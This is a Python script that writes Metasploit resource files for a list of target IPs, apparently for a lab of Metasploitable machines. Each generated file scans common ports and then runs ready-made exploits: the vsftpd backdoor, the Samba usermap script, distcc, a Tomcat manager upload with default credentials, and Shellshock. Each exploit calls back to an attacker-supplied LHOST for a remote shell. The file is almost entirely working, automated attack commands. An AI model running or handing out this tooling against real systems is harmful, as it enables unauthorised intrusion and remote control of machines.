from modules.core.utils import safe_filename

def generate_msf_resource_scripts(target_ips, lhost, output_dir="msf_scripts"):
    """
    Generate a Metasploit .rc file for each target in output_dir.
    Each script contains portscan and typical Metasploitable exploits.
    """
    import os
    os.makedirs(output_dir, exist_ok=True)

    rc_template = """
# Metasploit auto-script for {target}
use auxiliary/scanner/portscan/tcp
set RHOSTS {target}
set PORTS 21,22,23,25,80,139,445,3306,5432,3632,8180,8080
run

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {target}
set LHOST {lhost}
run

use exploit/multi/samba/usermap_script
set RHOSTS {target}
set LHOST {lhost}
run

use exploit/unix/misc/distcc_exec
set RHOSTS {target}
set LHOST {lhost}
run

use exploit/multi/http/tomcat_mgr_upload
set RHOSTS {target}
set LHOST {lhost}
set HTTPUSERNAME tomcat
set HTTPPASSWORD tomcat
run

use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS {target}
set RPORT 8080
set LHOST {lhost}
set TARGETURI /cgi-bin/test.cgi
run

exit
"""

    for target in target_ips:
        rc_content = rc_template.format(target=target, lhost=lhost)
        rc_path = os.path.join(output_dir, f"{safe_filename(target)}.rc")
        with open(rc_path, "w") as f:
            f.write(rc_content)
        print(f"Generated: {rc_path}")

# Usage Example:
# targets = ["192.168.56.103", "192.168.56.104"]
# lhost = "192.168.56.1"   # <-- YOUR Kali/attacker IP here!
# generate_msf_resource_scripts(targets, lhost)
